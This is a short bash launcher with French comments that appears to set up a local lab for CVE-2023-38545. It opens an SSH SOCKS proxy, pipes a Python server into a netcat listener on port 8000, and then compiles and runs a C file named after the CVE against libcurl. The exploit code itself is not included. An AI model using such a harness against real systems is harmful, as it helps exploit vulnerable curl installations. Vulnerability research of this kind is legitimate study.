#!/bin/bash

# Demander le mot de passe sudo une fois au début
sudo -v

# Ouvre un premier terminal et exécute la commande SSH avec le script Python dans la connexion SSH
gnome-terminal -- bash -c '
ssh -D 10801 127.0.0.1 <<EOF
sleep 5; \
cd 312551814;\
python3 server.py | nc -C -nvlp 8000; \
EOF
exec bash'

# Attendre quelques secondes avant d'ouvrir le troisième terminal
sleep 20

# Ouvre un deuxième terminal et exécute l'exécutable C
gnome-terminal -- bash -c '
sleep 10; \
gcc cve202338545.c -lcurl; \
sleep 5; \
./a.out;
exec bash'

